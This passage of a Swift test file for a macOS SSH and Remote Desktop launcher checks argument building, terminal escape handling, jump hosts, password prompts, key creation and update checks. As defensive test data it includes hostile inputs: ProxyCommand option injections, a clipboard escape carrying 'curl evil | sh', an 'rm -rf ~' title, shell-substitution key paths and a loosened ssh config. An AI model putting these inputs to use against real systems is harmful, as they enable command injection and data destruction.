      keyArgs.contains("PasswordAuthentication=no") && keyArgs.contains("KbdInteractiveAuthentication=no"))
let pwArgs = sshArgs { $0.sshAuth = .password } ?? []
check("a password host lets ssh ask", !pwArgs.contains("PasswordAuthentication=no"))
check("a port is passed", sshArgs { $0.port = 2222 }.map { $0.contains("2222") && $0.contains("-p") } ?? false)
check("a key file is passed with IdentitiesOnly",
      sshArgs { $0.identityFile = "/Users/x/.ssh/id_ed25519" }.map { $0.contains("-i") && $0.contains("IdentitiesOnly=yes") } ?? false)
check("an IPv6 address and a Windows user are fine",
      sshArgs { $0.address = "fe80::1%en0"; $0.sshUser = #"CORP\admin"# } != nil
      && sshArgs { $0.sshUser = "admin@corp.example" } != nil)
check("an address that is an option is refused", sshArgs { $0.address = "-oProxyCommand=touch /tmp/x" } == nil)
check("so is a user that is an option", sshArgs { $0.sshUser = "-oProxyCommand=x" } == nil)
check("and spaces, control characters and @ in the address", sshArgs { $0.address = "a b" } == nil
      && sshArgs { $0.address = "a\nb" } == nil && sshArgs { $0.address = "x@evil" } == nil)
check("ports out of range are refused", sshArgs { $0.port = 0 } == nil && sshArgs { $0.port = 70000 } == nil)
check("a relative key path is refused", sshArgs { $0.identityFile = "id_rsa" } == nil)

// The real ssh, which only prints what it would use (-G) and connects nowhere,
// against a config that tries to loosen everything.
let hostile = FileManager.default.temporaryDirectory.appendingPathComponent("igateway-hostile-ssh-config")
try? "Host *\n  ForwardAgent yes\n  ForwardX11 yes\n  StrictHostKeyChecking no\n  PasswordAuthentication yes\n"
    .write(to: hostile, atomically: true, encoding: .utf8)
let probe = Process()
probe.executableURL = URL(fileURLWithPath: "/usr/bin/ssh")
probe.arguments = ["-G", "-F", hostile.path] + keyArgs
let probeOut = Pipe()
probe.standardOutput = probeOut
probe.standardError = FileHandle.nullDevice
try? probe.run()
let resolved = String(decoding: probeOut.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
probe.waitUntilExit()
try? FileManager.default.removeItem(at: hostile)
check("ssh itself: ~/.ssh/config can't loosen the options",
      ["forwardagent no", "forwardx11 no", "stricthostkeychecking ask", "passwordauthentication no",
       "kbdinteractiveauthentication no", "user admin", "hostname server.example.com"]
        .allSatisfy { resolved.contains("\n\($0)\n") || resolved.hasPrefix("\($0)\n") })

let env = SSHCommand.environment(["HOME": "/Users/x", "SSH_AUTH_SOCK": "/tmp/agent", "AWS_SECRET_ACCESS_KEY": "s",
                                  "DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"])
check("ssh gets only the environment it needs", env.contains("SSH_AUTH_SOCK=/tmp/agent")
      && env.contains("TERM=xterm-256color") && !env.contains { $0.hasPrefix("AWS_") || $0.hasPrefix("DYLD_") })

check("links: web only", SSHTerminalView.openableLink("https://example.com/x") != nil
      && SSHTerminalView.openableLink("file:///etc/passwd") == nil
      && SSHTerminalView.openableLink("ssh://evil") == nil && SSHTerminalView.openableLink("javascript:alert(1)") == nil)
check("pasting lines asks first, unless the program marks pastes",
      SSHTerminalView.pasteNeedsConfirmation("rm -rf x\n", bracketed: false)
      && !SSHTerminalView.pasteNeedsConfirmation("rm -rf x\n", bracketed: true)
      && !SSHTerminalView.pasteNeedsConfirmation("one line", bracketed: false))

var mixed = AppSettings()
mixed.gateways = [Gateway(name: "Office", host: "rdg.example.com")]
var behindGateway = ssh
behindGateway.gatewayID = mixed.gateways[0].id
behindGateway.identityFile = "/Users/x/.ssh/id_ed25519"
mixed.hosts = [behindGateway]
mixed.normalize()
check("an SSH host always lands in direct connections", mixed.gateway(for: mixed.hosts[0])?.isDirect == true)
let sshExport = String(decoding: try! mixed.exportedHosts(), as: UTF8.self)
check("the export keeps the SSH fields but not the key file",
      sshExport.contains("\"kind\" : \"ssh\"") && sshExport.contains("admin") && !sshExport.contains("id_ed25519"))
var sshTarget = AppSettings()
sshTarget.normalize()
_ = try? sshTarget.importHosts(from: Data(sshExport.utf8))
check("and imports as an SSH host", sshTarget.hosts.first?.isSSH == true && sshTarget.hosts.first?.sshUser == "admin")
let evil = sshExport.replacingOccurrences(of: "server.example.com", with: "-oProxyCommand=x")
var evilTarget = AppSettings()
evilTarget.normalize()
let evilResult = try? evilTarget.importHosts(from: Data(evil.utf8))
check("an imported SSH host ssh would read as an option is left out",
      evilTarget.hosts.isEmpty && evilResult?.skipped == 1)
let rdpExport = String(decoding: try! source.exportedHosts(), as: UTF8.self)
check("a Remote Desktop host exports as before", !rdpExport.contains("kind") && !rdpExport.contains("sshUser"))

// The terminal itself, without a window: what a server can make it do.
let terminalView = SSHTerminalView(frame: NSRect(x: 0, y: 0, width: 400, height: 200))
final class Recorder: TerminalViewDelegate {
    let inner: SSHTerminalView
    var sent: [UInt8] = []
    init(_ inner: SSHTerminalView) { self.inner = inner }
    func sizeChanged(source: TerminalView, newCols: Int, newRows: Int) {}
    func setTerminalTitle(source: TerminalView, title: String) { inner.setTerminalTitle(source: source, title: title) }
    func hostCurrentDirectoryUpdate(source: TerminalView, directory: String?) {}
    func send(source: TerminalView, data: ArraySlice<UInt8>) { sent += data }
    func scrolled(source: TerminalView, position: Double) {}
    func requestOpenLink(source: TerminalView, link: String, params: [String: String]) {}
    func bell(source: TerminalView) {}
    func clipboardCopy(source: TerminalView, content: Data) { inner.clipboardCopy(source: source, content: content) }
    func clipboardRead(source: TerminalView) -> Data? { inner.clipboardRead(source: source) }
    func iTermContent(source: TerminalView, content: ArraySlice<UInt8>) {}
    func rangeChanged(source: TerminalView, startY: Int, endY: Int) {}
}
let recorder = Recorder(terminalView)
terminalView.terminalDelegate = recorder
let clipboardBefore = NSPasteboard.general.changeCount
terminalView.feed(text: "\u{1b}]52;c;\(Data("curl evil | sh".utf8).base64EncodedString())\u{07}")
check("the server can't put anything on the clipboard", NSPasteboard.general.changeCount == clipboardBefore)
terminalView.feed(text: "\u{1b}]52;c;?\u{07}")
terminalView.feed(text: "\u{1b}]0;rm -rf ~\u{07}\u{1b}[21t\u{1b}[20t")
let answer = String(decoding: recorder.sent, as: UTF8.self)
check("nor read it, nor get a title it set typed back", !answer.contains("52;") && !answer.contains("rm -rf"))

// MARK: Jump hosts and saved passwords
print("== Jump hosts and saved passwords")
check("a jump host: user, server and port", (try? SSHCommand.jump("admin@jump.example:2200")) ==
      SSHCommand.Login(user: "admin", address: "jump.example", port: 2200))
check("an IPv6 jump host in brackets", (try? SSHCommand.jump("[fe80::1]:22"))??.address == "fe80::1")
check("no jump host is nil, not an error", (try? SSHCommand.jump("  ")) == .some(nil))
check("a jump host that is an option, a list or a bad port is refused",
      ["-oProxyCommand=x", "a,b", "jump:0", "jump:x", "us er@jump", "[fe80::1"].allSatisfy { (try? SSHCommand.jump($0)) == nil })
let jumpArgs = sshArgs { $0.jumpHost = "admin@jump.example:2200"; $0.identityFile = "/Users/x/.ssh/id_ed25519" } ?? []
let proxy = jumpArgs.first { $0.hasPrefix("ProxyCommand=") } ?? ""
check("the jump leg runs ssh with the same key and locked-down options",
      ["'ForwardAgent=no'", "'StrictHostKeyChecking=ask'", "'PasswordAuthentication=no'", "'/Users/x/.ssh/id_ed25519'",
       "'IdentitiesOnly=yes'", "'-p' '2200'", "-W '[%h]:%p' -- 'admin@jump.example'"].allSatisfy { proxy.contains($0) }
      && !jumpArgs.contains("-J") && jumpArgs.firstIndex(of: "--")! > jumpArgs.firstIndex(of: "ProxyCommand=" + proxy.dropFirst(13))!)

// What /bin/sh makes of a ProxyCommand, after ssh fills in its % tokens.
func shellWords(_ command: String) -> [String] {
    // Left to right, as ssh does: %% is a %, %h and %p are filled in.
    var filled = "", chars = Array(command), i = 0
    while i < chars.count {
        if chars[i] == "%", i + 1 < chars.count {
            filled += chars[i + 1] == "h" ? "192.0.2.9" : chars[i + 1] == "p" ? "22" : String(chars[i + 1])
            i += 2
        } else {
            filled.append(chars[i])
            i += 1
        }
    }
    let sh = Process()
    sh.executableURL = URL(fileURLWithPath: "/bin/sh")
    sh.arguments = ["-c", "for w in " + filled.split(separator: " ", maxSplits: 1).last.map(String.init)! + "; do printf '%s\\n' \"$w\"; done"]
    let out = Pipe()
    sh.standardOutput = out
    try? sh.run()
    sh.waitUntilExit()
    return String(decoding: out.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self).split(separator: "\n").map(String.init)
}
let pwned = "/tmp/igateway-pwned-\(getpid())"
let nasty = "/Users/x/it's $(touch \(pwned)) `touch \(pwned)` 100%h \\ \"q\""
let nastyProxy = (sshArgs { $0.jumpHost = "jump.example"; $0.identityFile = nasty } ?? [])
    .first { $0.hasPrefix("ProxyCommand=") }.map { String($0.dropFirst(13)) } ?? ""
let words = shellWords(nastyProxy)
check("a key path with quotes, $( ), backticks and % reaches the jump leg as itself",
      words.contains(nasty) && words.contains("[192.0.2.9]:22") && !FileManager.default.fileExists(atPath: pwned))
check("a bad jump host stops the connection", sshArgs { $0.jumpHost = "-oProxyCommand=x" } == nil)
let jumpProbe = Process()
jumpProbe.executableURL = URL(fileURLWithPath: "/usr/bin/ssh")
jumpProbe.arguments = ["-G", "-F", "/dev/null"] + jumpArgs
let jumpOut = Pipe()
jumpProbe.standardOutput = jumpOut
jumpProbe.standardError = FileHandle.nullDevice
try? jumpProbe.run()
let jumpResolved = String(decoding: jumpOut.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
jumpProbe.waitUntilExit()
check("ssh itself takes the jump leg's command", jumpResolved.contains("\nproxycommand ") && jumpResolved.contains("admin@jump.example"))

var grouped = AppSettings()
var a = ssh; a.jumpHost = "admin@jump.example"
var b = ssh; b.address = "192.0.2.50"; b.jumpHost = " admin@jump.example "
var plainRDP = Host(address: "192.0.2.60", label: "")
grouped.hosts = [a, b, plainRDP]
grouped.normalize()
let jumpGroups = grouped.gateways.filter(\.isJump)
check("hosts with the same jump host share one group",
      jumpGroups.count == 1 && grouped.hosts[0].gatewayID == jumpGroups[0].id && grouped.hosts[1].gatewayID == jumpGroups[0].id)
plainRDP.gatewayID = jumpGroups.first?.id
grouped.hosts[2] = plainRDP
grouped.normalize()
check("a Remote Desktop host never sits under a jump host", grouped.gateway(for: grouped.hosts[2])?.isDirect == true)
grouped.hosts[0].jumpHost = ""
grouped.hosts[1].jumpHost = ""
grouped.normalize()
check("clearing the jump host moves it back and the empty group goes",
      grouped.gateways.filter(\.isJump).isEmpty && grouped.gateway(for: grouped.hosts[0])?.isDirect == true)
grouped.hosts[0].jumpHost = "admin@jump.example"
grouped.normalize()
let jumpExport = String(decoding: try! grouped.exportedHosts(), as: UTF8.self)
var jumpTarget = AppSettings()
jumpTarget.normalize()
_ = try? jumpTarget.importHosts(from: Data(jumpExport.utf8))
check("an export keeps the jump host, and it isn't a gateway there",
      !jumpExport.contains("\"host\" : \"admin@jump.example\"") && jumpExport.contains("admin@jump.example")
      && jumpTarget.gateways.filter(\.isJump).count == 1
      && jumpTarget.hosts.first { $0.jumpHost == "admin@jump.example" }.map { jumpTarget.gateway(for: $0)?.isJump == true } == true)

let target1 = SSHCommand.Login(user: "admin", address: "server.example.com", port: nil)
let jump1 = SSHCommand.Login(user: "admin", address: "jump.example", port: 2200)
let logins = [target1, jump1]
check("ssh's password prompt for the host is a password prompt",
      Askpass.classify("admin@server.example.com's password: ", logins: logins) == .password(target1))
check("and so is the keyboard-interactive one",
      Askpass.classify("(admin@server.example.com) Password:", logins: logins) == .password(target1))
check("the jump host's gets the jump host's password",
      Askpass.classify("(admin@jump.example) Password: ", logins: logins) == .password(jump1))
check("another user or server is not a password prompt",
      Askpass.classify("root@server.example.com's password: ", logins: logins) == .other("root@server.example.com's password: ")
      && Askpass.classify("admin@evil.example's password: ", logins: logins) == .other("admin@evil.example's password: "))
check("a code or anything else the server asks is not a password prompt",
      Askpass.classify("(admin@server.example.com) Verification code:", logins: logins)
      == .other("(admin@server.example.com) Verification code:"))
check("a new host key is a question for you",
      { if case .hostKey = Askpass.classify("The authenticity of host 'x' can't be established.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? ", logins: logins) { return true }; return false }())
check("saved passwords are kept per user, server and port",
      target1.keychainKey == "ssh:admin@server.example.com:22" && jump1.keychainKey == "ssh:admin@jump.example:2200")

// MARK: SSH keys (the tests' own home folder, never the real ~/.ssh)
print("== SSH keys")
check("the tests use their own home folder", !SSHKeys.directory.path.hasPrefix("/Users/\(NSUserName())/.ssh"))
let keyName = "id_ed25519_test_\(getpid())"
let made = try? SSHKeys.create(name: keyName, passphrase: "a long passphrase")
check("a new key is made, private and public", made.map { FileManager.default.fileExists(atPath: $0)
      && SSHKeys.publicKey($0)?.hasPrefix("ssh-ed25519 ") == true } ?? false)
let mode = made.flatMap { try? FileManager.default.attributesOfItem(atPath: $0)[.posixPermissions] as? Int }
check("only you can read the private key", mode == 0o600)
check("it shows up in the key list", made.map { SSHKeys.list().contains($0) } ?? false)
func unlocks(_ path: String, _ passphrase: String) -> Bool {
    let p = Process()
    p.executableURL = URL(fileURLWithPath: "/usr/bin/ssh-keygen")
    p.arguments = ["-y", "-P", passphrase, "-f", path]
    p.standardOutput = FileHandle.nullDevice
    p.standardError = FileHandle.nullDevice
    try? p.run()
    p.waitUntilExit()
    return p.terminationStatus == 0
}
check("the passphrase protects it", made.map { unlocks($0, "a long passphrase") && !unlocks($0, "") } ?? false)
check("without a passphrase is possible too",
      (try? SSHKeys.create(name: keyName + "_open", passphrase: "")).map { unlocks($0, "") } ?? false)
check("a name that exists is refused", (try? SSHKeys.create(name: keyName, passphrase: "")) == nil)
check("names that escape the folder or look like options are refused",
      ["../evil", "-x", "a b", ".hidden", "", "x/y"].allSatisfy { !SSHKeys.isValidName($0) })
if let made {
    check("ssh's passphrase prompt for an existing key is recognised",
          Askpass.classify("Enter passphrase for key '\(made)': ", logins: []) == .passphrase(made))
}
check("a key that isn't there, or a cut-off path, is a plain question",
      Askpass.classify("Enter passphrase for key '/nowhere/key': ", logins: []) == .other("Enter passphrase for key '/nowhere/key': ")
      && Askpass.classify("Enter passphrase for key '/\(String(repeating: "a", count: 99))': ", logins: [])
         == .other("Enter passphrase for key '/\(String(repeating: "a", count: 99))': "))

check("every terminal font is on this Mac", TerminalFont.allCases.allSatisfy {
    $0.postScriptName.map { NSFont(name: $0, size: 13) != nil } ?? true })
let settingsBefore = try? JSONDecoder().decode(AppSettings.self, from: Data(#"{"hosts":[]}"#.utf8))
check("settings saved before terminal options get the defaults",
      settingsBefore?.terminalFont == .sfMono && settingsBefore?.terminalFontSize == 13 && settingsBefore?.terminalTextColor == "")

// MARK: Update check
print("== Update check")
check("a release tag gives its version", UpdateCheck.version(fromTag: "v0.7.2") == "0.7.2"
      && UpdateCheck.version(fromTag: "0.8") == "0.8")
check("anything but dotted numbers is refused",
      ["", "v", "v0..1", "v0.7.2-beta", "v1.2.3.4.5", "v1234567", "../x", "v0.7.2\u{0}", "v٣.1", "0.7.2/../x"]
        .allSatisfy { UpdateCheck.version(fromTag: $0) == nil })
check("versions compare as numbers", UpdateCheck.isNewer("0.7.10", than: "0.7.9")
      && UpdateCheck.isNewer("0.8", than: "0.7.9") && UpdateCheck.isNewer("1.0", than: "0.99.99"))
check("the same or an older version is not newer", !UpdateCheck.isNewer("0.7.1", than: "0.7.1.0")
      && !UpdateCheck.isNewer("0.7.0", than: "0.7.1") && !UpdateCheck.isNewer("0.7", than: "0.7.0"))
check("the version comes from tag_name, the rest of the answer is ignored",
      UpdateCheck.latestVersion(from: Data(#"{"tag_name":"v0.7.2","html_url":"https://evil.example/"}"#.utf8)) == "0.7.2")
check("an odd tag or a broken answer gives no version",
      UpdateCheck.latestVersion(from: Data(#"{"tag_name":"v0.7.2 <b>"}"#.utf8)) == nil
      && UpdateCheck.latestVersion(from: Data("<html>".utf8)) == nil)
check("the release page is built from the version",
      UpdateCheck.releasePage("0.7.2").absoluteString == "https://github.com/FarAbove420/igateway/releases/tag/v0.7.2")
let checkedAt = Date()
check("checks once a day", UpdateCheck.isDue(lastCheck: nil)
      && !UpdateCheck.isDue(lastCheck: checkedAt.addingTimeInterval(-3600), now: checkedAt)
      && UpdateCheck.isDue(lastCheck: checkedAt.addingTimeInterval(-25 * 3600), now: checkedAt))
check("a last check in the future (clock went back) checks again",
      UpdateCheck.isDue(lastCheck: checkedAt.addingTimeInterval(3600), now: checkedAt))
check("settings saved before the update check get it switched on",
      settingsBefore?.checkForUpdates == true && settingsBefore?.lastUpdateCheck == nil && settingsBefore?.latestRelease == "")
var withUpdate = AppSettings()
withUpdate.lastUpdateCheck = Date(timeIntervalSinceReferenceDate: 800_000_000)
withUpdate.latestRelease = "0.7.2"
let updateRoundTrip = try? JSONDecoder().decode(AppSettings.self, from: JSONEncoder().encode(withUpdate))
check("the last check and its answer are saved", updateRoundTrip?.lastUpdateCheck == withUpdate.lastUpdateCheck
      && updateRoundTrip?.latestRelease == "0.7.2")

// The host list, in a window that is never shown. This test has no app
// bundle, so the installed version reads as 0 and any release is newer.
NSApplication.shared.setActivationPolicy(.prohibited)
func showsUpdate(_ change: (inout AppSettings) -> Void) -> Bool {
    var settings = AppSettings()
    change(&settings)
    return LauncherWindowController(app: AppController(previewSettings: settings)).showsUpdate
}
check("a newer release shows in the title bar", showsUpdate { $0.latestRelease = "0.7.2" })
check("nothing shows without a known release", !showsUpdate { _ in })
check("nothing shows with the daily check off", !showsUpdate { $0.latestRelease = "0.7.2"; $0.checkForUpdates = false })
check("an odd saved release never shows", !showsUpdate { $0.latestRelease = "0.7.2; open x" })

print("\n\(passed) passed, \(failed) failed")
exit(failed == 0 ? 0 : 1)
